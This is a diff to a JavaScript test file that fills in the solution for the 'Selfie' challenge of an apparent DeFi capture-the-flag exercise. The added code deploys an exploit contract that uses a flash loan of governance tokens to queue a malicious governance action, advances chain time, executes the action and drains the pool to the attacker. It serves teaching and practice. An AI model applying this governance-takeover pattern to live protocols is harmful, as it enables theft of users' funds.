@@ -31,6 +31,34 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // connect as the attacker.
+        this.token = this.token.connect(attacker);
+        this.governance = this.governance.connect(attacker);
+        this.pool = this.pool.connect(attacker);
+
+        const ExploitFactory = await ethers.getContractFactory("SelfieExploit", attacker);
+        this.exploit = await ExploitFactory.deploy(this.pool.address);
+
+        // check the initial balance of the attacker.
+        console.log("Attacker initial balance " + await this.token.balanceOf(attacker.address));
+
+        // trigger the loan
+        await this.exploit.triggerLoan(TOKENS_IN_POOL);
+
+        console.log("FIRST ACTION " + await this.governance.actions(0));
+
+        // Check whether the action has been populated.
+        console.log("SECOND ACTION " + await this.governance.actions(1));
+
+        // 2 days have to pass between proposal of the action and its execution.
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        
+        // execute the action
+        await this.exploit.callAction();
+
+        console.log("Pool balance " + await this.token.balanceOf(this.pool.address));
+        console.log("Attacker's updated balance " + await this.token.balanceOf(attacker.address));
     });
 
     after(async function () {
